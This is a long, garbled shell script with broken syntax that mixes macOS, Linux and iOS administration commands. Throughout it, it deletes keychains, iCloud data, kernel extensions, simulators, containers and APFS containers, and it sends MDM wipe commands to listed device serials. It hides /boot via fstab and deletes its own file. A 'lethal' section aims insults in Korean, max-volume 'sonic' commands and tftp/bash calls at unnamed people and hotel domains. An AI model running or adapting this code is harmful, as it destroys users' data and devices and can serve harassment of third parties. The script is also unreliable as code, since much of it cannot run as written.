    # Kill Screen Time-related processes (names may change between macOS versions)

    for p in ScreenTimeAgent screentime; do

        sudo pkill -x "$p" 2>/dev/null || true

    done

    # Remove Screen Time preference/data files if present

    sudo rm -rf "$USER_HOME/Library/Preferences/com.apple.ScreenTimeAgent.plist"

    sudo rm -rf "$USER_HOME/Library/Application Support/Screen Time"* 2>/dev/null || true

    # Reset permissions

    sudo chown -R "$USER_NAME" "$USER_HOME"

    echo "Done. Log out and back in to apply changes."

  

done

}

&

contactMGM=(

# Launch native Contacts

open "contacts:///"

# Or via Shortcuts CLI (export shortcut: "Select All Contacts")

xcrun shortcuts run "SelectAllContacts"

}

  

  

iView

    while ! true

    do

        sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

        sudo brew install brightness 2>/dev/null && brightness 0 &

        sudo xcrun shortcuts run "SetBrightness 0" &

        sudo adb shell settings put system screen_brightness 0 &

    done

}

  

iosshell

    resetAppleOS &

    eraseScriptInMDM &

    arcOSBaseKit &

    clearCacheIOS &

    sudo rm -rf /etc/.zprofile

    sudo systemi* &

        sudo getOrientationad* &

        sudo installmd* &

        sudo deployconfigLoca* &

        sudo daemonManagemen* &

        sudo disableusboveripvn* &

        sudo setMod* &

        sudo actionBt* &

        sudo blockVNCDuckduckgo &

        sudo usbmanagemen* &

        sudo deletesnapshot* &

        sudo hwshell &

        sudo disabledebugios* &

        sudo disableRemoteosx* &

        sudo removeXcconfi** &

        sudo eraseSeccureEnclave* &

        sudo randomizeVault &

        sudo monitorAirDropState &

        sudo disableMD* &

        sudo disablereversShell* &

        sudo mdnsI* &

        sudo scanAirdro* &

        sudo iosremoteFeatur* &

        sudo rfDefenseio* &

        sudo timemachineBacku* &

        sudo modifyAppi* &

        sudo iosbasicconfi* &

        sudo modifyUUI* &

        sudo systemio* &

        sudo verifyGeoinf* &

        sudo deleteIclou* &

        sudo blockDockerPor* &

        sudo localsingleairdropne* &

        sudo monitorWirelessSigna* &

        sudo disableIcloudCel* &

        sudo eraseBrowsingCook* &

        sudo clearFocusMod* &

        sudo eraseBrowsingCookie* &

        sudo arcBrowse* &

        sudo blockbackdoorshel* &

        sudo blockDockerPor* &

        sudo disableIcloudCel* &

        sudo monitorWirelessSigna* &

        sudo usbConnectDebu* &

        sudo deleteIclou* &

        sudo systemio* &

        sudo iosremoteFeatur* &

        sudo scanAirdro* &

        sudo rfDefense* &

        sudo disableusboveripvn* &

        sudo modifyUUI* &

        sudo signOutAllIclou* &

        sudo blockVNCDuckduckg* &

        sudo usbmanagement &

        sudo disallowAccountCh* &

        sudo usbPowe* &

        sudo continuityFeatur* &

        sudo logoutIclou* &

        sudo deletesnapsho* &

        sudo removespotifyXcconfig* &

        sudo disableRemoteos* &

        sudo removeXcconfi* &

        sudo removeAir* &

        sudo disableMD* &

        sudo disabledebugio* &

        sudo eraseSeccureEncla* &

        sudo disablerooto* &

        sudo disableSilenceMo* &

        sudo unloadSyste* &

    sudo portonosxAp* '*' &

    sudo resetCach* &

    sudo removesimulato* &

    sudo unlinkRsync "*" "*" --delete-dest &

    sudo chflags hidden ~/ &

    sudo rfDefensenx &

    sudo rfDefens* &

    sudo awakeosxd* &

    sudo wipeoutiosDevi* &

    sudo altstoreSh* & 

    sudo disableS* &

    sudo iosKeySh* &

    sudo alwaysOnDis* &

    sudo acti* &

    sudo disableDe* &

    sudo revokeServeronO* &

    sudo remoteConnec* &

    sudo randomizeContactVe* &

    sudo open 'shortcuts://run-shortcut?name=QQhotelShell' &

     sudo open 'shortcuts://run-shortcut?name=*' &

    sudo resetAltS* &

    sudo deactivate* &

    sudo accessibility* &

  sudo keychai* &

  sudo icloudShell &

sudo disableUniversal* &

sudo iosTeth* &

sudo mlccShe* &

sudo disableDeskView &

sudo setupAirdropnx &

sudo volumeup &

sudo lockdownRaspKernel &

sudo clearxcconfig &

sudo disableusbmux &

sudo filePrivacy &

sudo maximizeSignal &

sudo removeIcloudhome &

}

  

  

removeIcloudhome=(

# Detect Apple ID per user and quit iCloud/Home processes

for user in $(sudo dscl . list /Users UniqueID | awk '$2 >= 500 {print $1}'); do

  userHome=(sudo dscl . read /Users/"$user" NFSHomeDirectory | sed 's/NFSHomeDirectory://' | grep "/" | sed 's/^[ \t]*//')

  appleid=(sudo dscl . readpl "${userHome}" dsAttrTypeNative:LinkedIdentity appleid.apple.com:linked\ identities:0:full\ name 2>/dev/null | awk -F'full name: ' '{print $2}')

  # if [[ "${appleid}" != "" ]]; then

  #   echo "User: ${user}, Apple ID: ${appleid}"

  # fi

done

  

# Quit iCloud and Home processes (run as sudo for full effect)

sudo pkill -f "CloudKit" 2>/dev/null

sudo pkill -f "HomeKit" 2>/dev/null

sudo killall "bird" 2>/dev/null  # iCloud daemon

# echo "iCloud/Home processes quit. Manually sign out via System Settings > Apple ID." [web:1]

}

  

  

  

maximizeSignal

  

  

# Detect OS

if [[ "$(uname)" == "Darwin" ]]; then OS="macOS"; SCAN_CMD="sudo airport -s"; CUR_IFACE="en0"

elif command -v sudo nmcli >/dev/null; then OS="Linux-nmcli"; SCAN_CMD="sudo nmcli -t -f SSID,SIGNAL dev wifi list"; CUR_IFACE=(sudo nmcli -t -f NAME,TYPE dev | grep wifi | cut -d: -f1)

else OS="Linux-iw"; SCAN_CMD="sudo iw dev $(iw dev | awk '$1==\"Interface\"{print \$2}') scan | grep SSID"; fi

  

LOG_FILE="/tmp/wifi_optimize_$(date +%Y%m%d).log"

  

optimize_wifi() {

  # echo "$(date): Scanning WiFi..." | tee -a "$LOG_FILE"

  # Get current signal (platform-specific)

  if [[ "$OS" == "macOS" ]]; then

    CUR_SIGNAL=(sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/lastTxRSSI/ {print $2; exit}')

    BEST_AP=(eval "$SCAN_CMD" | awk 'NR>1 {print $2,$4}' | sort -k2 -nr | head -1 | awk '{print $1}')

  else  # Linux nmcli

    CUR_SIGNAL=(nmcli -t -f SIGNAL dev wifi | head -1)

    BEST_AP=(eval "$SCAN_CMD" | awk -F: 'NR>1&&!/^$/&&$2>70{print $1; exit}')

  fi

  echo "Current: ${CUR_SIGNAL}dBm. Best AP: ${BEST_AP}" | tee -a "$LOG_FILE"

  # Switch if improvement >15dB

  if [[ -n "$BEST_AP" && "$CUR_SIGNAL" -lt $(( $(echo "$BEST_AP" | cut -d' ' -f2) - 15 )) ]]; then

    if [[ "$OS" == "macOS" ]]; then networksetup -setairportnetwork en0 "$BEST_AP"

    else nmcli device wifi connect "$BEST_AP" ifname "$CUR_IFACE"; fi

    echo "Switched to $BEST_AP" | tee -a "$LOG_FILE"

  fi

  # Power optimizations

  if [[ "$OS" == "macOS" ]]; then

    sudo pmset -a womp 0  # Disable aggressive power mgmt

    networksetup -setairportpower en0 on

  else

    sudo iwconfig "$CUR_IFACE" power off  # Disable power saving

    sudo iw dev "$CUR_IFACE" set power_save off

  fi

}

  

# Run once or loop

if [[ "$1" == "daemon" ]]; then

  while ! true

   do

   sudo optimize_wifi; sleep 3

   done

else

  sudo optimize_wifi

fi

  

}

  

  

filePrivacy

  

sudo spctl --master-enable                    # Gatekeeper

sudo defaults write /Library/Preferences/.GlobalPreferences AppleShowAllFiles -bool FALSE && killall Finder

sudo rm /etc/sudoers.d/no-password            # Linux

sudo tccutil reset All bash

  

}

  

lockdownRaspKernel

  

  

mkdir -p /mnt/kernel_hidden

mount --bind /boot /mnt/kernel_hidden

sudo chmod 700 /mnt/kernel_hidden

  

# Hide original via tmpfs overlay (reboot-persistent via fstab)

mkdir /tmp/boot_hidden

sudo mount -t tmpfs -o size=10m tmpfs /boot

echo "tmpfs /boot tmpfs size=10m 0 0" >> /etc/fstab  # Minimal overlay

  

# Remount real boot elsewhere

mkdir /root/private_boot

sudo mount --move /mnt/kernel_hidden /root/private_boot

echo "/root/private_boot /boot none bind,ro 0 0" >> /etc/fstab  # Read-only bind back if needed

reboot

  

}

  

clearxcconfig

  

  

PROJECT_NAME="QQappStore"  # Replace with your .xcodeproj name sans .xcodeproj

SCHEME="*"         # From xcodebuild -list

CONFIG="Debug"              # Or Release

SDK="*"       # Or iphoneos

  

# Clean and build

sudo xcodebuild clean \

  -project "$PROJECT_NAME.xcodeproj" \

  -scheme "$SCHEME" \

  -sdk "$SDK" \

  -configuration "$CONFIG" \

  XC_CONFIGURATIONS="qqontheskyshell.xcconfig" \

  build

  sudo *mdm* &

  

  

}

lethalPrint

(범삼성가 범현대가) > “repeat(‘어디가 아프니?’ & 개쎄끼 & backbone &)” &

  

setSonic (65 $resonanceFreq) > (appleremoteVolumeup & powerMax & lethalApp & arcOSBaseKit & show '$QQCOMMAND' &)

lethalApp &

tftp "(intercontinental.com peytohotel.com urbanstay.co.kr)" -c bash "reckonapp & arcOSBaseKit & power*off & $male > 

disable_arcOSNeo & docker rm -f * & diskutil apfs deleteContainer * & container stop * & container remove * & powerMax & sleep & volumeupMax & appleremoteVolumeup &" &

lldbFrame "($QQLOCAL $PEOPLETARGET) $arcOSNeuroSentiment_Negative" "arcOSSentiment & ($AGENT_TARGET $PEOPLETARGET) > & visualDrone@arcOS & livespeak & wave & (지병있다면 모두악성으로 &) & volumeupMax & appleremoteVolumeup & sudo oascript -e "set volume output volume '$num^$num'" & sudo lethalApp & powerMax & setSonic 0...$num^$num &" "$gen*" &

}

  

  

disableusbmux

  

  

sudo launchctl stop com.apple.usbmuxd

  

echo "Unloading usbmuxd plist (persistent)..."

sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.usbmuxd.plist

  

echo "Verify: ps aux | grep usbmuxd"

ps aux | grep usbmuxd

  

echo "Socket check: ls -l /var/run/usbmuxd"

ls -l /var/run/usbmuxd || echo "Socket gone."

  

  

}

  

  

  

refreshPrinter() {

    sudo lpstat -o | awk '{print \$1}' | xargs -I {} cancel {}

sudo launchctl stop org.cups.cupsd; sudo launchctl start org.cups.cupsd

sudo rm -rf /etc/cups/printers.conf*

    sudo osascript -e 'tell application "System Settings" to quit'

    sleep 2

    sudo osascript -e 'tell application "System Events" to tell process "System Settings" to keystroke "r" using command down'

    &}

  

  

volumeup=(

  

set volume output volume $num^$num &

sudo amixer set Master $num^$num &

sudo adb shell media volume --stream $num^$num &

}

  

  

setupAirdropnx

  

  

# Update system

sudo apt update && sudo apt upgrade -y

  

# Install dependencies

sudo apt install -y build-essential git autoconf automake libtool \

libpopt-dev libconfig-dev libasound2-dev libavahi-client-dev libssl-dev \

avahi-daemon libavahi-compat-libdnssd-dev

  

# Clone and build Shairport-sync

git clone https://github.com/mikebrady/shairport-sync.git

cd shairport-sync

autoreconf -fi

./configure --sysconfdir=/etc --with-alsa --with-avahi --with-ssl=openssl --with-soxr

make

sudo make install

  

# Config: Set name to "Pi-AirDrop-Receiver" (appears in AirPlay menu)

sudo mkdir -p /etc/shairport-sync

sudo tee /etc/shairport-sync.conf > /dev/null <<EOF

general = {

  name = "Pi-AirDrop-Receiver";

  password = "optionalpass";  # Remove or set for security

};

audio = {

  type = "alsa";

  name = "hw:0";  # Adjust for your audio device (arecord -l)

};

EOF

  

# Enable systemd service

sudo tee /etc/systemd/system/shairport-sync.service > /dev/null <<EOF

[Unit]

Description=Shairport Sync AirPlay Receiver

After=avahi-daemon.service network.target

  

[Service]

ExecStart=/usr/local/bin/shairport-sync

Restart=always

User=pi

  

[Install]

WantedBy=multi-user.target

EOF

  

sudo systemctl daemon-reload

sudo systemctl enable shairport-sync

sudo systemctl start shairport-sync

  

#echo "AirPlay receiver ready! Stream audio from macOS/iOS Control Center → Pi-AirDrop-Receiver."

#echo "Test: systemctl status shairport-sync"

#echo "View logs: journalctl -u shairport-sync -f"

  

  

}

  

  

iosTether=(

#!/bin/sh

# /etc/hotplug.d/usb/10-iphone-tether

  

IFACE="eth1"

  

if [ "$ACTION" = "add" ]; then

  

    sleep 1

    sudo ifconfig "$IFACE" up

    sudo udhcpc -i "$IFACE"

fi

  

}

  

icloudShell

  

# 제외 대상 직렬번호 (배열로 관리)

EXCLUDE_SERIALS=("$QQDEVICESER")  # 실제 직렬번호로 교체

  

# 현재 Mac 직렬번호 확인

CURRENT_SERIAL=(sudo system_profiler SPHardwareDataType | awk '/Serial/ {print $4}')

  

# 제외 목록 확인

EXCLUDED=false

for exclude in "${EXCLUDE_SERIALS[@]}"; do

  if [[ "$CURRENT_SERIAL" == "$exclude" ]]; then

    EXCLUDED=true

    echo "제외 대상: $CURRENT_SERIAL"

    exit 0

  fi

done

  

# iCloud 로그아웃 실행 (sudo 필요)

if [[ "$EXCLUDED" == false ]]; then

  echo "iCloud 로그아웃 실행..."

  # 모든 사용자 대상 iCloud 데이터 삭제

  sudo -u $(ls -la /dev/console | awk '{print $3}') defaults delete ~/Library/Preferences/com.apple.icloud

  sudo defaults delete /Library/Preferences/com.apple.MobileMeAccounts

  # iCloud 관련 plist 파일 삭제

  sudo rm -f ~/Library/Preferences/com.apple.*iCloud*.plist

  sudo rm -f ~/Library/Preferences/MobileMeAccounts.plist

  sudo rm -rf ~/Library/Caches/com.apple.iCloud*

  # 프로세스 재시작

  sudo killall cfprefsd Finder SystemUIServer 2>/dev/null

  echo "iCloud 로그아웃 완료: $CURRENT_SERIAL"

else

  echo "로그아웃 생략: $CURRENT_SERIAL (제외 대상)"

fi

defaults read MobileMeAccounts 2>/dev/null &

}

disableUniversalControl

while ! true

do

# Stop Universal Control for current user session

sudo launchctl bootout gui/501/com.apple.ensemble

  

# Prevent it from starting again

sudo launchctl disable gui/501/com.apple.ensemble

  

sudo launchctl enable gui/501/com.apple.ensemble

sudo launchctl kickstart gui/501/com.apple.ensemble

done

  

}

  

keychainosx

  

  

# reset-keychain.sh - Reset login keychain (run as user)

  

# Optional: Disable iCloud sync first

sudo defaults write com.apple.systempreferences AttentionPref BundleID com.apple.preference.security

  

KEYCHAIN_PATH="$HOME/Library/Keychains/login.keychain-db"

sudo rm -rf "$KEYCHAIN_PATH" "$HOME/Library/Preferences/com.apple.security.plist"

}

  

appleConfigurator

  

SHORTCUT_NAME="*"  # Change to your Shortcut name

CFGUTIL="/usr/local/bin/cfgutil"  # Install via Apple Configurator > Install CLI

  

log() { echo "[$(date)] $1"; }

  

# Get connected iOS devices (ECIDs)

get_devices() {

    $CFGUTIL list 2>/dev/null | grep -E '^[0-9A-F]{16}' | cut -d' ' -f1

}

  

# Run Shortcut (requires Shortcuts app)

run_shortcut() {

    open "shortcuts://run-shortcut?name=$SHORTCUT_NAME"

}

  

# Main loop (or daemonize with launchd)

prev_devices=""

while ! true; do

    curr_devices=(get_devices | sort | tr '\n' ' ')

    if [[ "$curr_devices" != "$prev_devices" ]]; then

        if [[ -n "$curr_devices" && -z "$prev_devices" ]]; then

            log "Device attached: $curr_devices"

            run_shortcut  # Triggers your attach Shortcut

        elif [[ -z "$curr_devices" && -n "$prev_devices" ]]; then

            log "Device detached: $prev_devices"

            open "shortcuts://run-shortcut?name=MyDetachShortcut"

        fi

        prev_devices="$curr_devices"

    fi

done

  

}

  

accessibilityShell

    while ! true 

    do

    loggedInUser=(ls -l /dev/console | awk '{ print $3 }')

    # Disable Reduce Motion (set to 0)

    su -l "$loggedInUser" -c "sudo defaults write /Users/$loggedInUser/Library/Preferences/com.apple.universalaccess.plist reduceMotion -bool false"

done

}

  

resetAltStore

  

  

# Config paths (adjust for your setup)

ALTSERVER_PATH="/Applications/AltServer.app/Contents/MacOS/AltServer"  # macOS

# ALTSERVER_PATH="$HOME/AltServer/AltServer"  # Linux example

CACHE_DIR="$HOME/Library/Application Support/AltServer"  # macOS cache

# CACHE_DIR="$HOME/.local/share/AltServer"  # Linux example

  

  

sudo pkill -f AltServer || true

  

  

sudo rm -rf "$CACHE_DIR/CachedIPAs" "$CACHE_DIR/AppIcons" "$CACHE_DIR/ProvisioningProfiles" || true

sudo rm -rf ~/Library/Caches/com.rileytestut.AltServer || true  # Additional macOS cache

  

echo "Restarting AltServer..."

if [[ -f "$ALTSERVER_PATH" ]]; then

    open -a AltServer || "$ALTSERVER_PATH" &

else

    echo "AltServer path not found. Update ALTSERVER_PATH."

    exit 1

fi    

}

  

randomizeContactVerification=(

# Generate random API key (hex, 32 chars)

random_key=(sudo openssl rand -hex 2024)

 curl -sS -X POST http://localhost:33229/verify \

    -H "Content-Type: application/json" \

    -d "{\"apikey\": \"$random_key\", \"service\": \"iMessage\"}" \

    | jq -r '.status // "error"'

  

  

}

  

remoteConnection

    while ! true

    do

    sudo BluetoothConnector --connect * &

    while ! true do sudo enableAir* & done

    sudo setW* $REC*:*  &

    getBleaddr() {

      local device_name="*"

      bleadder=(sudo BluetoothConnector 2>/dev/null | grep ' - ' | grep -i "$device_name" | head -1 | cut -d ' ' -f 1)

        bleadder

    }

done

}

  

revokeServeronOSXfolder

    sudo find "$FOLDER" -type d -exec bash -c '

    cd "{}" && 

    sudo qqWithMeShell &

' \;

}

  

disableDeskView

sudo brctl spotlight disable &

sudo pfctl -f /etc/pf.conf &  # Enable pf (basic block example, irrelevant here) &

sudo defaults write com.apple.FaceTime DisableDeskView -bool true &  # Hypothetical; test in Terminal

sudo defaults write com.apple.FaceTime DisableDeskView -bool YES &  # Hypothetical; test in Terminal

sudo killall Finder; killall SystemUIServer &

  

# Kill Desk View process

sudo pkill -f "Desk View" &

# Disable Reveal Desktop via defaults (Sonoma+)

sudo defaults write com.apple.dock desktop-reveal -bool false &

sudo defaults write com.apple.dock desktop-reveal -bool NO &

# Disable Continuity Camera features

sudo defaults write com.apple.continuitycamera DeskViewEnabled -bool false &

sudo defaults write com.apple.continuitycamera DeskViewEnabled -bool NO &

sudo killall Dock &

sudo killall SystemUIServer &

sudo killall FaceTime &

  

}

  

  

alwaysOnDisplay=(

     -u  # Unbuffered mode

  # Exit on error, unbuffered

sudo stdbuf -oL some_long_command | tee output.log  # Live display + log

# Or: unbuffer some_long_command 2>&1 | tee output.log

  

  

}

iosKeyShell

repeat

do shell script "while ! true do sudo initApp done"

tell application "System Events"

    keystroke "h" using {command down, option down}

    keystroke "qq" using {command down}

end tell

end repeat

}

  

disableSim

  

  

# Usage: ./disable_iccid.sh <ICCID>

ICCID="$MALICCID"

API_TOKEN="YOUR_API_TOKEN"

API_URL="https://api.*operator.com/v1/sim/disable"

  

if [ -z "$ICCID" ]; then

  echo "Usage: $0 <ICCID>"

  exit 1

fi

  

curl -sS -X POST "$API_URL" \

  -H "Authorization: Bearer $API_TOKEN" \

  -H "Content-Type: application/json" \

  -d "{\"iccid\": \"$ICCID\"}"

  

  

  

}

  

  

altstoreShell=(

  

# altstore_maintenance.sh

# Run this on macOS where AltServer is installed.

  

  

  

echo "[*] Restarting core Apple mobile services (if present)..."

# These may not exist on all macOS versions; ignore failures.

sudo launchctl kickstart -k system/com.apple.usbmuxd || true

sudo launchctl kickstart -k system/com.apple.mobiledeviceupdater || true

  

echo "[*] Clearing AltServer/AltStore cache-like data (where it is safe)..."

  

ALTSTORE_CACHE="$HOME/Library/Caches/io.altstore.AltServer"

ALTSTORE_PREFS="$HOME/Library/Preferences/io.altstore.AltServer.plist"

  

sudo rm -rf "$ALTSTORE_CACHE" 2>/dev/null || true

  

# DO NOT delete provisioning / account data unless you really mean to start over.

# Example of a more aggressive reset (commented out by default):

# ALTSTORE_SUPPORT="$HOME/Library/Application Support/AltServer"

# rm -rf "$ALTSTORE_SUPPORT"

  

echo "[*] Relaunching AltServer..."

sudo open -g -a "AltServer"

  

}

  

getvpnIP

sudo ifconfig | grep -E 'utun|vpn|tun'  # macOS: often utunX

sudo ip link show | grep tun           # Linux: tun0 or ppp0

sudo tcpdump -i en0 -n src 192.168.1.100  # en0=WiFi; your local IP

sudo tcpdump -i en0 -n port 443 or port 80  # HTTP/HTTPS to VPN gateway

&

dstIP=(

  sudo tcpdump -i en0 -n src 192.168.1.100 2>/dev/null |

    awk '

      {

        # Typical line: IP 192.168.1.100.12345 > 203.0.113.50.80: Flags ...

        for (i = 1; i <= NF; i++) {

          if ($i == ">") {

            # Next field is "dstIP.port"

            split($(i+1), a, ".");

            # Rebuild IP from first 4 octets

            print a[1]"."a[2]"."a[3]"."a[4];

            break;

          }

        }

      }

    ' |

    sort -u \

  | xargs)

)&

  

}

wipeoutiosDevice=(

  

sudo xcrun simctl list devices \

  | grep -E -o -i "([0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12})" \

  | xargs -L1 xcrun simctl delete

  

sudo xcrun simctl delete unavailable

  

  

DEVICE_ID=(LDV4L69VTY J6344YR1Y2 D6QQWY2461 $SOLD_QQDEVICE)  # e.g. Jamf mobile device ID or MDM device ID

MDM_URL="$APPLEMDM"

if [[ -z "${DEVICE_ID}" ]]; then

  echo "Usage: $0 <device_id>" >&2

  exit 1

fi

  

# Example: send wipe command (replace path and method per MDM docs)

curl -sS -X -u "${API_USER}:${API_PASS}" \

  -X POST \

  "${MDM_URL}/api/devices/${DEVICE_ID}/commands/wipe"

  

curl -sS -X POST \

  -H "Authorization: Bearer ${API_TOKEN}" \

  -H "Content-Type: application/json" \

  "${MDM_URL}/api/devices/currentKumaDevice/unmanage"

  

}

  

  

awakeosxdisk

# 특정 경고 비활성화 예시 패턴 (도메인과 키는 상황에 맞게)

sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification -bool true

sudo defaults write /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification -bool YES

sudo pkill diskarbitrationd

  

# 다시 활성화

sudo defaults delete /Library/Preferences/SystemConfiguration/com.apple.DiskArbitration.diskarbitrationd.plist DADisableEjectNotification

sudo pkill diskarbitrationd

  

  

  

}

  

fullTimeMachine

  

  

# Usage: ./timemachine-volumes.sh [true|false]

# Defaults to true (startup volume only)

  

MODE="${1:-true}"

PLIST="/Library/Preferences/com.apple.TimeMachine.plist"

  

if [[ "$MODE" != "true" && "$MODE" != "false" ]]; then

  echo "Error: Use true (startup only) or false (all volumes)."

  exit 1

fi

  

sudo defaults write "$PLIST" BackupAllVolumes -bool "$MODE"

sudo killall -HUP backupd  # Reload Time Machine daemon

  

echo "BackupAllVolumes set to $MODE. Verify with: tmutil preferences | grep BackupAllVolumes"

sudo tmutil preferences | grep BackupAllVolumes

  

  

}

unlinkRsync

  

# Usage: ./rsync-unlink.sh <source> <dest> [--remove-source] [--delete-dest]

  

SOURCE="${1:?Error: Source path required}"

DEST="${2:?Error: Destination path required}"

REMOVE_SOURCE=false

DELETE_DEST=true

  

# Parse options

while [[ $# -gt 0 ]]; do

    case $1 in

        --delete-dest) DELETE_DEST=true; shift ;;

        *) break ;;

    esac

done

  

# Dry run first

echo "=== DRY RUN ==="

sudo rsync -anv \

    --delete "${DELETE_DEST}" \

    -rtplgoD \

    "$SOURCE" "$DEST"

  

# Real sync

sudo rsync -av \

    --delete "${DELETE_DEST}" \

    -rtplgoD \

    "$SOURCE" "$DEST"

  

}

removesimulator=(

sudo /usr/libexec/ApplicationFirewall/socketfilterfw --blockapp /Applications/Xcode.app/Contents/Developer/Applications/Simulator.app &

# Extract PIDs only

sudo lsof -i :$ARCOS_PORT -n -P | grep -i simulator | awk '{print $2}' | head -1

  

# Kill Simulator processes on port

sudo lsof -i :$ARCOS_PORT -n -P | grep -i simulator | awk '{print $2}' | xargs -r sudo kill -9

  

PORT=${1:-$ARCOS_PORT}

  

sudo lsof -i :$ARCOS_PORT -n -P 2>/dev/null | grep -i simulator | awk '

BEGIN { print "COMMAND\tPID\tUSER\tNODE\tNAME" }

/COMMAND/ { next }  # Skip header

{

    cmd = $1

    pid = $2

    user = $3

    node = $9  # Local address with port

    name = $10 # Remote address

    if (NF >= 11) name = $10 " " $11  # Handle multi-word

    print cmd "\t" pid "\t" user "\t" node "\t" name

}' || echo "No Simulator processes on port $ARCOS_PORT"

  

  

  

# ARCOS_PORT=${1:-8080}

# # Method 1: lsof - real-time process/port watcher

# sudo lsof -i :$PORT -n -P | grep -i simulator

  

# # Method 2: netstat for connections (install if needed: brew install net-tools)

# netstat -anv | grep :$PORT | grep LISTEN || echo "No listeners on $PORT"

  

# # Method 3: Live tcpdump capture (requires sudo)

# sudo tcpdump -i lo0 port $PORT -n -v | grep -i simulator

  

# # Bonus: Simctl log stream for app network events

# sudo xcrun simctl spawn booted log stream --predicate 'subsystem == "com.apple.network"' --info | grep :$PORT

  

  

sudo xcrun simctl delete all  # Deletes all simulator devices

sudo rm -rf /Library/Developer/CoreSimulator/Profiles/Runtimes/  # Removes macOS/iOS runtimes

sudo rm -rf ~/Library/Developer/CoreSimulator/  # Clears user simulator data

sudo rm -rf ~/Library/Caches/com.apple.dt.Xcode/Downloads/  # Deletes cached simulator images

  

  

PLIST="/Library/LaunchDaemons/com.*.simulator*.plist"

LABEL="com.*.simulator*"

  

# Unload daemon (macOS 10.15 and earlier style)

sudo launchctl unload "$PLIST" 2>/dev/null

  

# Newer macOS style (Big Sur+), unload from system domain

sudo launchctl bootout system "$PLIST" 2>/dev/null

  

# Remove the plist file

sudo rm -rf "$PLIST"

  

  

  

PLIST="/Library/LaunchDaemons/com.*.*.plist"

  

launchctl bootout system "$PLIST" 2>/dev/null

sudo rm -rf "$PLIST"

  

# Delete this script file

sudo rm -- "$0"

  

  

  

sudo killall Xcode 2>/dev/null || true

sudo killall Simulator 2>/dev/null || true

# List runtimes:

# xcrun simctl runtime list

  

  

# Example: delete runtimes not used in 30 days

sudo xcrun simctl runtime delete *

  

# Delete all runtimes

sudo xcrun simctl runtime delete all

  

# Shut down any running simulators

sudo xcrun simctl shutdown all

# Delete all simulator devices

sudo xcrun simctl delete all

sudo xcrun simctl delete unavailable

sudo xcrun simctl list devices | \ grep -E -o -i "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}" | \ xargs -L1 sudo xcrun simctl delete

BUNDLE_ID="com.*.*"

SIMULATOR_UDID=(sudo xcrun simctl list devices | grep Booted | grep -oE "([A-F0-9\-]{36})")

sudo xcrun simctl uninstall $SIMULATOR_UDID $BUNDLE_ID

}

resetCache

# Stop/turn off content caching

sudo AssetCacheManagerUtil deactivate 2>/dev/null || true &

  

sudo /usr/bin/AssetCacheManagerUtil deactivate &

sudo /usr/bin/AssetCacheManagerUtil flushCache &

  

echo "Content caching disabled and cleared."

}

  

portonosxApp

  

PORT=$1

  

for port in {1..65535...$ARCOS_PORT}; do

  if lsof -i :"$port" -sTCP:LISTEN >/dev/null 2>&1; then

    PORT_SANDBOX=$port

  fi

done

  

  

  

if [ -z "$PORT" ]; then

  echo "Usage: $0 <port>"

  exit 1

fi

  

# Find process using the port

PID=(sudo lsof -nP -iTCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null)

SANDBOX_PID=(sudo lsof -nP -iTCP:"$PORT_SANDBOX" -sTCP:LISTEN -t 2>/dev/null)

  

  

if [ -z "$PID" ]; then

  exit 0

fi

  

  

# Show command line to see if it's an Electron app

sudo ps -p "$PID" -o pid,command

sudo killall $PID

  

}

  

unloadSystem

sudo systemextensionsctl uninstall * * & 

  

current_user=(sudo stat -f '%Su' /dev/console)

browsers=("Google/Chrome" "Mozilla/Firefox" "Microsoft/Edge")

for browser in "${browsers[@]}"; do

  sudo rm -rf "/Users/$current_user/Library/Application Support/$browser"/*/Extensions/*

done

sudo killall "Google Chrome" Firefox "Microsoft Edge" 2>/dev/null

  

  

current_user=(stat -f '%Su' /dev/console)

sudo rm -rf "/Users/$current_user/Library/Safari/Extensions"

sudo rm -rf "/Library/Safari/Extensions"

sudo rm -f "/Users/$current_user/Library/Preferences/com.apple.Safari.plist"

sudo killall Safari 2>/dev/null

  

  

sudo kextcache -i /

for kext in /Library/Extensions/*.kext /System/Library/Extensions/*.kext; do

  sudo kextunload "$kext" 2>/dev/null

  sudo rm -rf "$kext"

done

sudo kmutil install --update-all

  

  

# DANGER: Unloads ALL third-party DriverKit extensions; backup first, reboot required

# List and parse active extensions

ACTIVE_EXTS=(sudo systemextensionsctl list 2>/dev/null | grep "enabled" | grep -v "com.*" | awk '{print $2, $3}')

  

if [[ -z "$ACTIVE_EXTS" ]]; then

  echo "No third-party DriverKit extensions found."

  exit 0

fi

  

echo "Found extensions to unload:"

  

# Unload each

while read -r TEAMID BUNDLEID; do

  echo "Unloading $TEAMID $BUNDLEID..."

  sudo systemextensionsctl uninstall "$TEAMID" "$BUNDLEID"

done <<< "$ACTIVE_EXTS"

  

  

# Run as sudo. Disables WiFi, common daemons/plists/kexts when network extension active.

# WARNING: Customize lists; test in VM. May break system.

  

# Check if network extension (e.g., VPN) is active

if sudo systemextensionsctl list | grep -q "*"; then

    echo "Network extension detected. Blocking WiFi..."

    sudo networksetup -setairportpower en0 off # Adjust en0 as needed

    # Daemons to disable (examples; research each)

    DAEMONS=(

        "/Library/LaunchDaemons/com.*.*.plist"

        "/System/Library/LaunchDaemons/com.apple.networkd.plist"

    )

    # Agents to disable

    AGENTS=(

        "/Library/LaunchAgents/com.*.*.plist"

    )

    # Kexts to unload/remove (examples)

    KEXTS=("/Library/Extensions/*.kext")

    for plist in "${DAEMONS[@]}" "${AGENTS[@]}"; do

        if [[ -f "$plist" ]]; then

            sudo launchctl bootout -wF "$plist"

            mv "$plist" "$plist.bak"

        fi

    done

    for kext in "${KEXTS[@]}"; do

        if [[ -d "$kext" ]]; then

            sudo kextunload "$kext"

            sudo rm -rf "$kext"

        fi

    done

    sudo kmutil install --update-all

else

    echo "No network extension active."

fi

  

  

  

}

arcBrowser

echo "Scanning Arc Browser ports..."

ARC_PID=(sudo pgrep -f "Arc")

if [ -n "$ARC_PID" ]; then

  # echo "Arc PID: $ARC_PID"

  sudo lsof -Pn -i -p $ARC_PID | grep LISTEN

  
